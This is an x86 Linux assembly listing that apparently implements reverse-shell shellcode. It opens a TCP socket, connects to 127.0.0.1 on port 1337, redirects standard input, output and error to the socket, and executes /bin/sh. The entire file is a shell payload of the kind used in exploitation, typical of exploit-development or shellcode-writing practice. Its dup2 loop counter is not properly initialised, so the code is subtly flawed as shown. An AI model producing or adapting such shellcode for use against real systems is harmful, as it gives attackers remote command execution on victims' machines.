SECTION .text
	GLOBAL _start

_start:
	push	0x0 ; push arguments for socket creation
	push	0x1
	push	0x2
	
	mov	eax,	0x66 ; socketcall
	mov	ebx,	0x1
	mov	ecx,	esp
	int	0x80

	mov	ebp,	eax ; copy the socket file descriptor into ebp

	push	0x0100007f ; create structure for socket connection & push as argument
	push	0x39050002
	mov	ecx,	esp
	push	0x10
	push	ecx
	push	ebp

	mov	eax,	0x66 ; socketcall
	mov	ebx,	0x3
	mov	ecx,	esp
	int	0x80

	mov	ebx,	ebp ; copy sockfd into ebx for dup2
	mov	ecx,	ecx ; set dup2 counter

_dup2loop:          ; dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2)
	mov	eax,	0x3f
	int	0x80
	inc	ecx
	cmp	ecx,	4
	jnz	_dup2loop

	mov	eax,	0x0b ; execve("/bin/sh", NULL, NULL)
	push	0x0
	push	0x0068732f
	push	0x6e69622f
	mov	ebx,	esp
	mov	ecx,	0
	mov	edx,	0
	int	0x80
